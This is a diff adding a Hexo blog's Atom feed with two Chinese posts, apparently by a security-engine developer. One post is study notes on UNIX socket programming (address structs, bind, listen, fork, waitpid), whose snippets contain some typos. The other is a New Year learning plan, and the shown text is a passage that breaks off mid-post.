@@ -1,0 +1,1300 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Breaker&#39;s Blog</title>
+  <subtitle>作为意志和表象的世界</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://0x7c00.com/"/>
+  <updated>2017-05-08T17:19:24.599Z</updated>
+  <id>http://0x7c00.com/</id>
+  
+  <author>
+    <name>Breaker</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>UNIX网络编程</title>
+    <link href="http://0x7c00.com/2017/UNIX-Network-program/"/>
+    <id>http://0x7c00.com/2017/UNIX-Network-program/</id>
+    <published>2017-01-15T18:17:12.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>unix网络编程知识总结</p>
+<a id="more"></a>
+<h2 id="socket编程简介"><a href="#socket编程简介" class="headerlink" title="socket编程简介"></a>socket编程简介</h2><h3 id="套接字地址结构"><a href="#套接字地址结构" class="headerlink" title="套接字地址结构"></a>套接字地址结构</h3><p><strong>POSIX通用数据类型</strong><br>数据类型|说明|头文件<br>–|–|–<br>int8_t | 带符号的8位整数| <code>&lt;sys/types.&gt;</code><br>uint8_t | 无符号的8位整数 | <code>&lt;sys/types.h&gt;</code><br>int16_t | 带符号的16位整数| <code>&lt;sys/types.h&gt;</code><br>uint16_t | 无符号的16位整数 | <code>&lt;sys/types.h&gt;</code><br>int32_t | 带符号的32位整数| <code>&lt;sys/types.h&gt;</code><br>uint32_t | 无符号的32位整数 | <code>&lt;sys/types.h&gt;</code><br>sa_family_t|套接字地址结构的地址组|<code>&lt;sys/socket.h&gt;</code><br>socklen_t|套接字地址长度的结构，一般为<code>uint32_t</code>|<code>&lt;sys/socket.h&gt;</code><br>in_addr_t|IPv4地址，一般为<code>uint32_t</code>|<code>&lt;netinet/in.h&gt;</code><br>in_port_t|端口号，一般为<code>uint16_t</code>|<code>&lt;netinet/in.h&gt;</code></p>
+<p><strong>IPv4网际套接字地址结构<code>重点</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">in_addr_t</span> saddr;           <span class="comment">/* 32-bit IPV4 addr */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint8_t</span> sin_len;            <span class="comment">/* struct len(16) */</span></div><div class="line">	<span class="keyword">sa_family_t</span> sin_family;     <span class="comment">/* AF_INET */</span></div><div class="line">	<span class="keyword">in_port_t</span> sin_port;        <span class="comment">/* 16-bit port num */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>    <span class="comment">/* 32bit-IPV4 addr */</span></div><div class="line">	<span class="keyword">char</span> sin_zero[<span class="number">8</span>];           <span class="comment">/* unused */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>常用操作<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></div><div class="line">bzero(&amp;addr, <span class="keyword">sizeof</span>(addr));</div><div class="line">addr.sin_family = AF_INET;</div><div class="line">addr.sin_addr.s_addr = htonl(<span class="string">"0.0.0.0"</span>);</div><div class="line">addr.sin_port = htons(<span class="number">1</span>);</div></pre></td></tr></table></figure></p>
+<ul>
+<li>sin_len 并不是所有的结构体都支持这个字段。即使有该字段，我们也无需设置他。</li>
+<li>POSIX规范只需要结构中的三个字段:sin_family、sin_addr和sin_port三个字段。起他额外字段都是可以接受的。</li>
+<li>几乎所有实现都增加了sin_zero字段</li>
+<li>in_port_t和in_addr_t都是以网络字序存储的(大端存储)。</li>
+<li><p>32bit IPv4地址有两种访问方式，既<code>struct in_addr</code> 类型或<code>in_addr_t</code>类型。</p>
+<blockquote>
+<p>sin_addr并不是一个uint32类型的整数而是一个in_addr类型的结构体是有一定历史原因的。在早期的时候，struct in_addr被定义为多种结构的联合体。允许访问32bit中的任意4个字节，或者任意两个16bit的值。这些结构在地址被划分为A类B类C类的时候便于方便的获取适当的字节。而随着子网划分和无类子网的编排，各种地址类正在消失、那个联合体已经不在需要了。</p>
+</blockquote>
+</li>
+<li><p>套接字结构总是用在给定的主机中，虽然有些字段用来进行主机间通讯。</p>
+</li>
+</ul>
+<p><strong>通用套接字</strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">uint8_t</span> sa_len;</div><div class="line">    <span class="keyword">sa_family_t</span> sa_family;</div><div class="line">    <span class="keyword">char</span> sa_data[<span class="number">14</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>所有的套接字函数的套接字地址参数的类型是固定的，想要传入不同类型的套接字结构体指针，按照现在的思路可以强制转换成<code>void *</code>类型。但是这种格式是ASC C规定的，在82年的时候还不能使用这样的方式。所以引入了一个通用套接字结构。通用套接字结构完全是为了满足套接字函数可以传入不同类型的套接字结构体指针而设计的。</p>
+<p>所有的linux提供的套接字函数调用的时候都必须强制转换成通用套接字。</p>
+<p>IPv6<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
+<p><strong>新的通用套接字</strong><br>不像<code>struct sockaddr</code>，新的<code>struct sockaddr_storage</code>足以容纳系统锁支持的任何套接字地址结构。<code>struct sockaddr_storage</code>结构定义在<code>&lt;netinet/in.h&gt;</code>中<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_stroage</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">uint8_t</span> len;</div><div class="line">    <span class="keyword">sa_family_t</span> sin_family;</div><div class="line">    <span class="comment">/*</span></div><div class="line">        </div><div class="line">    */</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="主机字序和网络字序"><a href="#主机字序和网络字序" class="headerlink" title="主机字序和网络字序"></a>主机字序和网络字序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="keyword">uint32_t</span> htonl(<span class="keyword">uint32_t</span> hostlong);	<span class="comment">//32bit 主机地址转网络地址</span></div><div class="line"><span class="keyword">uint16_t</span> htons(<span class="keyword">uint16_t</span> hostshort);	<span class="comment">//16bit 主机地址转网络地址</span></div><div class="line"><span class="keyword">uint32_t</span> ntohl(<span class="keyword">uint32_t</span> hostlong);	<span class="comment">//32bit 网络地址转主机地址</span></div><div class="line"><span class="keyword">uint16_t</span> ntohs(<span class="keyword">uint16_t</span> hostshort);	<span class="comment">//16bit 网络地址转主机地址</span></div></pre></td></tr></table></figure>
+<h3 id="字节操作函数"><a href="#字节操作函数" class="headerlink" title="字节操作函数"></a>字节操作函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bzero</span><span class="params">(<span class="keyword">void</span> * dest, <span class="keyword">size_t</span> bbytes)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bcopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * src, <span class="keyword">void</span> * dest, <span class="keyword">size_t</span> nbytes)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * str1, <span class="keyword">const</span> <span class="keyword">void</span> * str2, <span class="keyword">size_t</span> nbytes)</span></span>;</div></pre></td></tr></table></figure>
+<h3 id="地址转换函数"><a href="#地址转换函数" class="headerlink" title="地址转换函数"></a>地址转换函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inte.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * str, struct in_addr *addrptr)</span></span>;</div><div class="line"><span class="function"><span class="keyword">char</span> <span class="title">inet_ntoa</span><span class="params">(struct in_addr inaddr)</span></span>;</div></pre></td></tr></table></figure>
+<h3 id="新的地址转换函数"><a href="#新的地址转换函数" class="headerlink" title="新的地址转换函数"></a>新的地址转换函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
+<p>##基本TCP套接字编程<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> struct sockaddr * addr, <span class="keyword">size_t</span> len)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> backlog)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> fd, struct sockaddr * clientaddr, <span class="keyword">size_t</span> * clientlen)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> struct sockaddr * serveraddr, <span class="keyword">size_t</span> serverlen)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">exec</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsockname</span><span class="params">(<span class="keyword">int</span> fd, struct sockaddr * addr, <span class="keyword">size_t</span> * len)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpeername</span><span class="params">(<span class="keyword">int</span> fd, strcut sockaddr * addr, <span class="keyword">size_t</span> * len)</span></span>;</div></pre></td></tr></table></figure></p>
+<h3 id="socks函数"><a href="#socks函数" class="headerlink" title="socks函数"></a>socks函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="comment">/*  </span></div><div class="line">* 创建套接字，返回文件描述符</div><div class="line">* family - 协议族，常用 AF_UNIX、AF_LOCAL、AF_INET4、AF_INET6 </div><div class="line">* type - socket类型，常用SCOK_STREAM、SOCK_DGRAM、SOCK_RAW</div><div class="line">* protoal - 通常为0</div><div class="line">* 返回值  返回-1失败，否则返回值为文件描述符。</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</div></pre></td></tr></table></figure>
+<h2 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="comment">/*</span></div><div class="line">* 绑定套接字地址</div><div class="line">* fd 文件描述符 </div><div class="line">* server_addr 填充好的sockaddr结构体。一般需要强制转换类型</div><div class="line">* len 结构体大小</div><div class="line">* 成功返回 0 </div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> fd, struct sockaddr * server_addr, <span class="keyword">size_t</span> len)</span></span>;</div></pre></td></tr></table></figure>
+<p>一般用法<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> result = bind(fd, (struct sockaddr *) &amp; server_addr, <span class="keyword">sizeof</span>(server_addr));</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="number">0</span> == result)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"绑定[%s]:%d成功\n"</span>, inet_ntoa(server_addr.sin_addr.s_addr));</div><div class="line">    </div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"绑定[%s]:%d失败\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> backlog)</span></span>;</div></pre></td></tr></table></figure>
+<p>listen函数监听套接字，传入套接字类型必须是<code>SOCK_STREAM</code> or <code>SOCK_SEQPACKET</code>.<br>backlog 最大队列数，当连接数超过这个值的时候，不接受新的连接<br>成功返回0，-1失败。</p>
+<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"hello from the child"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"hello from the parent"</span>)；</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>发现数P92页的错误</strong><br>92页很多函数调用的时候，函数名大小写错误。<br> <a href="https://www.amazon.cn/TCP-IP%E8%AF%A6%E8%A7%A3%C2%B7%E5%8D%B71-%E5%8D%8F%E8%AE%AE-%E5%87%AF%E6%96%87R-%E7%A6%8F%E5%B0%94/dp/B01HGINTJ2/ref=sr_1_2?ie=UTF8&amp;qid=1483255527&amp;sr=8-2&amp;keywords=tcpip%E8%AF%A6%E8%A7%A3" target="_blank" rel="external">TCP/IP详解·卷1:协议(原书第2版) 平装</a></p>
+<h3 id="值-结果类型参数"><a href="#值-结果类型参数" class="headerlink" title="值-结果类型参数"></a>值-结果类型参数</h3><p>使用getsockname函数获取套接字地址的时候，总是返回0.0.0.0.查了半天资料，才发现getsockname的最后一个参数len是”值-结果”类型参数。<br>也就是说，在调用函数前，len是addr的长度，函数返回由，len也是addr的长度，但是两个长度的含义不一样。一个是参数，一个是结果。</p>
+<p>值-结果类型函数都有:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> fd, struct sockaddr * clientaddr, <span class="keyword">size_t</span> * clientlen)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsockname</span><span class="params">(<span class="keyword">int</span> fd, struct sockaddr * addr, <span class="keyword">size_t</span> * len)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpeername</span><span class="params">(<span class="keyword">int</span> fd, strcut sockaddr * addr, <span class="keyword">size_t</span> * len)</span></span>;</div></pre></td></tr></table></figure></p>
+<p>被坑了一把 -.-!</p>
+<h2 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h2><p>waitpid()会暂时停止目前进程的执行，直到有信号来到或子进程结束。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> * status, <span class="keyword">int</span> options);</div></pre></td></tr></table></figure></p>
+<ol>
+<li>如果在调用 waitpid()时子进程已经结束,则 waitpid()会立即<br>返回子进程结束状态值</li>
+<li>子进程的结束状态值会由参数 status 返回,而子进程的进程识别码也会一起返回</li>
+<li>如果不在意结束状态值,则参数 status 可以设成 NULL。参数 pid 为欲等待的子进程识别码,<blockquote>
+<p><strong>参数pid</strong></p>
+<ol>
+<li>pid &lt; -1 等待进程组识别码为 pid 绝对值的任何子进程</li>
+</ol>
+</blockquote>
+</li>
+<li>pid = -1 等待任何子进程,相当于 wait()。</li>
+<li>pid = 0 等待进程组识别码与目前进程相同的任何子进程。</li>
+<li>pid &gt; 0 等待任何子进程识别码为 pid 的子进程</li>
+</ol>
+<blockquote>
+<p><strong>参数option</strong></p>
+<ol>
+<li>参数<code>options</code>提供了一些额外的选项来控制waitpid，参数 option 可以为 0 或可以用”|”运算符把它们连接起来使用，比如：<code>WNOHANG | WUNTRACED</code>。若不需要设置为零</li>
+<li><code>WNOHANG</code> 若pid指定的子进程没有结束，则<code>waitpid()</code>函数返回0，不予以等待。若结束，则返回该子进程的ID。</li>
+<li><code>WUNTRACED</code> 若子进程进入暂停状态，则马上返回，但子进程的结束状态不予以理会。<code>WIFSTOPPED(status)</code>宏确定返回值是否对应与一个暂停子进程。</li>
+</ol>
+<p><strong>参数status</strong><br>子进程的结束状态返回后存于status,底下有几个宏可判别结束情况:</p>
+<ol>
+<li><code>WIFEXITED(status)</code><br>如果若为正常结束子进程返回的状态，则为真；对于这种情况可执行<code>WEXITSTATUS(status)</code>，取子进程传给exit或_eixt的低8位。</li>
+<li><code>WEXITSTATUS(status)</code><br>取得子进程<code>exit()</code>返回的结束代码,一般会先用<code>WIFEXITED</code> 来判断是否正常结束才能使用此宏。</li>
+<li><code>WIFSIGNALED(status)</code><br>若为异常结束子进程返回的状态，则为真；对于这种情况可执行WTERMSIG(status)，取使子进程结束的信号编号。</li>
+<li><code>WTERMSIG(status)</code><br>取得子进程因信号而中止的信号代码,一般会先用 WIFSIGNALED 来判断后才使用此宏。</li>
+<li><code>WIFSTOPPED(status)</code><br>若为当前暂停子进程返回的状态，则为真；对于这种情况可执行WSTOPSIG(status)，取使子进程暂停的信号编号。</li>
+<li><code>WSTOPSIG(status)</code><br>取得引发子进程暂停的信号代码,一般会先用WIFSTOPPED来判断后才使用此宏。</li>
+</ol>
+</blockquote>
+<p>如果执行成功则返回子进程识别码(PID) ,如果有错误发生则返回返回值-1。失败原因存于 errno 中。</p>
+<h2 id="TCP-server-client编程"><a href="#TCP-server-client编程" class="headerlink" title="TCP server client编程"></a>TCP server client编程</h2><h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><p>之前做工作中接触过nginx服务器。对nginx的架构有一定了解，打算做一个类似的服务器。具体还没想好</p>
+<p>预备知识:</p>
+<ul>
+<li>网络编程相关</li>
+<li>服务器架构</li>
+<li><code>linux I\O</code>相关编程</li>
+<li>计算机网络</li>
+<li>操作系统原理</li>
+</ul>
+<p>可能用到的技术:</p>
+<ul>
+<li>DPDK</li>
+<li>mTCP</li>
+<li>协程</li>
+<li>内存管理</li>
+<li>libevent</li>
+<li>JIT</li>
+</ul>
+<p>这些都是我在工作中接触到的并且处在知其然而不知其所以然的状态，其中有些技术是冲突的，不能同时使用。希望在这个服务器中尽量的使用这些技术，完全是为了熟悉这些技术。最后可能做成四不像，然而这并不是很重要。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;unix网络编程知识总结&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="unix" scheme="http://0x7c00.com/tags/unix/"/>
+    
+      <category term="program" scheme="http://0x7c00.com/tags/program/"/>
+    
+      <category term="network" scheme="http://0x7c00.com/tags/network/"/>
+    
+      <category term="linux" scheme="http://0x7c00.com/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>新年快乐</title>
+    <link href="http://0x7c00.com/2016/happy-new-year/"/>
+    <id>http://0x7c00.com/2016/happy-new-year/</id>
+    <published>2016-12-31T13:00:20.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><p>还剩几个小时，2017年就要到来了。16年的工作和学习状态不是很满意。新的一年要再接再厉。</p>
+<blockquote>
+<ul>
+<li>原文地址</li>
+<li>原文作者： Breaker</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+<h2 id="这是？"><a href="#这是？" class="headerlink" title="这是？"></a>这是？</h2><p>这是我为了从一个网络安全开发者蜕变为资深网络安全<em>(精通计算机网络、linux网络编程、linux内核)</em>开发者的计划，其计划历时数月。</p>
+<p><strong>我的目标是找到一种相对比较高效的学习方法</strong>。在平时的工作和学习中，每天都要面对大量的需要学习知识和技能。如果纯粹只是为了当时解决工作中遇到的某个问题，而不重视知识的积累，这样造成的结果就是今天查到的东西在未来某一天需要用到的时候还要在查一遍。纯粹是浪费时间。</p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
+<h2 id="为何用到它"><a href="#为何用到它" class="headerlink" title="为何用到它"></a>为何用到它</h2><p>为了我以后的工作和目标而遵守这份计划。2015年7月以来，我一直从事入侵防御系统系统引擎的开发工作。通过一年多的工作，已经大致掌握了网络安全工作原理。在工作中明显感觉到知识匮乏，这是工作效率不能令我满意的原因。仔细思考了下，在新的一年里需要学习的内容有三方面：计算机网络、 linux网络编程以及linux内核。所以需要一次系统的知识升级。</p>
+<h2 id="如何使用它"><a href="#如何使用它" class="headerlink" title="如何使用它"></a>如何使用它</h2><p>下面的东西都只是一个概述。因此，你需要自上而下的逐一的处理它。<br>在学习过程中，用<code>TO DO LIST</code>标记和检查学习进度。</p>
+<h2 id="Follow-me"><a href="#Follow-me" class="headerlink" title="Follow me"></a>Follow me</h2><p>我是一个对网络安全很高兴趣的软件工程师，目前就职与NSFOCUS。<br>为了达到我的目标，每天完成艰辛的工作后，平均学习三小时。<br>我已经在梦想实现的途中了。<br>Github: <a href="https://github.com/iBreaker" target="_blank" rel="external">@Breaker</a><br>Coding: <a href="https://coding.net/u/breaker" target="_blank" rel="external">@Breaker</a></p>
+<h2 id="别认为自己不够聪明"><a href="#别认为自己不够聪明" class="headerlink" title="别认为自己不够聪明"></a>别认为自己不够聪明</h2><p>虽然已经下定决心，但是辛苦的工作了一天之后我担心自己是否由能承受高负荷的学习。</p>
+<blockquote>
+<p>加强运动，劳逸结合。</p>
+</blockquote>
+<p>看到砖头厚的书感到力不从心.</p>
+<blockquote>
+<p>想想掌握这么多知识后的喜悦。</p>
+</blockquote>
+<h2 id="关于视频资源"><a href="#关于视频资源" class="headerlink" title="关于视频资源"></a>关于视频资源</h2><p>网络上有很多视频资源可以学习，推荐看书疲倦了可以看看视频。</p>
+<h2 id="在你开始之前"><a href="#在你开始之前" class="headerlink" title="在你开始之前"></a>在你开始之前</h2><p>该列表已经持续更新了很长的一段时间，所以，我们的确很容易会对其失去控制。<br>这里列出了一些我所犯过的错误，希望您不要重滔覆辙。</p>
+<h3 id="0-保持兴趣"><a href="#0-保持兴趣" class="headerlink" title="0. 保持兴趣"></a>0. 保持兴趣</h3><p>最重要的写在最前面，保持兴趣是最大的动力。所以不要枯燥的看书，可以列出一些很有意思的项目来实现。比如说学习linux编程可以写一个服务器出来。就想我之前学习操作系统写了一个小型操作系统<a href="http://os.0x7c00.cn" target="_blank" rel="external">OS One</a> 一样。</p>
+<h3 id="1-你不可能把所有的东西都记住"><a href="#1-你不可能把所有的东西都记住" class="headerlink" title="1. 你不可能把所有的东西都记住"></a>1. 你不可能把所有的东西都记住</h3><p>就算我查看了数小时的视频，并记录了大量的笔记。几个月后的我，仍然会忘却其中大部分的东西。所以，我翻阅了我的笔记，并将可回顾的东西记成笔记，<code>印象笔记</code>、<code>博客</code>或者<code>github仓库</code>。</p>
+<h3 id="2-记笔记"><a href="#2-记笔记" class="headerlink" title="2. 记笔记"></a>2. 记笔记</h3><p>我习惯使用<code>makedown</code>记笔记，这在开发者中已经非常普遍了。将写完的笔记保存到印象笔记、个人博客或者github仓库中。印象笔记不支持markdown，可以用马克飞象编辑，编辑完后上传到印象笔记，很方便。最主要的是马克飞象的界面很友好，我已经买了一年的马克飞象。相对与博客来说，印象笔记比较私密。普通的github账户和博客差不多，都是完全开放的。但是我的github账户是高级账户，可以创建私有仓库。可以很好的利用这一点。</p>
+<h3 id="3-重复、重复再重复"><a href="#3-重复、重复再重复" class="headerlink" title="3.重复、重复再重复"></a>3.重复、重复再重复</h3><p>在手机上很方便的看之前的笔记和文章，可以很好的利用空余时间复习。<br>每编程半个小时就要休息一下，并很轻松的去回顾你的笔记。</p>
+<h3 id="4-专注"><a href="#4-专注" class="headerlink" title="4. 专注"></a>4. 专注</h3><p>在学习的过程中，往往会有许多令人分心的事占据着我们宝贵的时间。因此，专注和集中注意力是非常困难的。</p>
+<h3 id="5-技巧"><a href="#5-技巧" class="headerlink" title="5. 技巧"></a>5. 技巧</h3><ul>
+<li>第一遍学习不要陷入细节，抓住主要知识点，记录笔记</li>
+<li>第二遍回看的时候详细思考，不能只记住结果，要思考原因</li>
+<li>利用空余时间重复进行第三遍第四遍第五遍学习</li>
+</ul>
+<h2 id="日常计划"><a href="#日常计划" class="headerlink" title="日常计划"></a>日常计划</h2><p>部分问题可能会花费一天的时间去学习，而部分则会花费多天。当然，有些学习并不需要我们懂得如何实现。<br>因此，每一天我都会在下面所列出的列表中选择一项，并查看相关的视频。然后，使用以下的一种语言去实现：</p>
+<blockquote>
+<p>C —— 使用结构体和函数，该函数会接受一个结构体指针 * 及其他数据作为参数。<br>C++ —— 不使用内建的数据类型。<br>C++ —— 使用内建的数据类型，如使用 STL 的 std::list 来作为链表。<br>Python ——  使用内建的数据类型（为了持续练习 Python），并编写一些测试去保证自己代码的正确性。有时，只需要使用断言函数 assert() 即可。<br>此外，你也可以使用 Java 或其他语言。以上只是我的个人偏好而已。</p>
+</blockquote>
+<p>为何要在这些语言上分别实现一次？</p>
+<blockquote>
